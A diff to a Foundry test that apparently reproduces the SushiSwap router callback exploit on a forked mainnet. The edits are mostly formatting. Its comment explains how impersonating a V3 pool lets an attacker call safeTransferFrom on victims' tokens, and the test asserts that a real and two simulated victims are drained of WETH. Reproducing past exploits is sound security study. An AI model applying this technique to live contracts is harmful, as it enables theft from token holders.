@@ -12,6 +12,7 @@ contract SushiYoink is Test, ForkUtils {
      * @notice SushiSwap router exploit comes from a bad callback. Although the line 328 comment in routerProcessor2 is correct,
      *         line 340 does not check the pool deployer. So you can impersonate a V3Pool, do a no-op swap, call safeTransferFrom
      *         on an arbitrary ERC20 and arbitrary from address on line 347 of routerProcessor2 contract.
+     * FLOW IN SHORT:
      */
     //Importants addresses
     address constant ROUTER_ADDRESS = 0x044b75f554b886A065b9567891e45c79542d7357;
@@ -40,7 +41,7 @@ contract SushiYoink is Test, ForkUtils {
         console.log("Attacker deployed at:", address(attacker));
 
         // Initialize victims
-        realVictim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;//real mainnet victim at attack time
+        realVictim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1; //real mainnet victim at attack time
         victim1 = makeAddr("victim1");
         victim2 = makeAddr("victim2");
 
@@ -78,7 +79,10 @@ contract SushiYoink is Test, ForkUtils {
         uint256 victim1BalanceAfter = weth.balanceOf(victim1);
         uint256 victim2BalanceAfter = weth.balanceOf(victim2);
 
-        assertEq(attackerBalanceAfter, attackerBalanceBefore + realVictimBalanceBefore + victim1BalanceBefore + victim2BalanceBefore);
+        assertEq(
+            attackerBalanceAfter,
+            attackerBalanceBefore + realVictimBalanceBefore + victim1BalanceBefore + victim2BalanceBefore
+        );
         assertEq(realVictimBalanceAfter, 0);
         assertEq(victim1BalanceAfter, 0);
         assertEq(victim2BalanceAfter, 0);
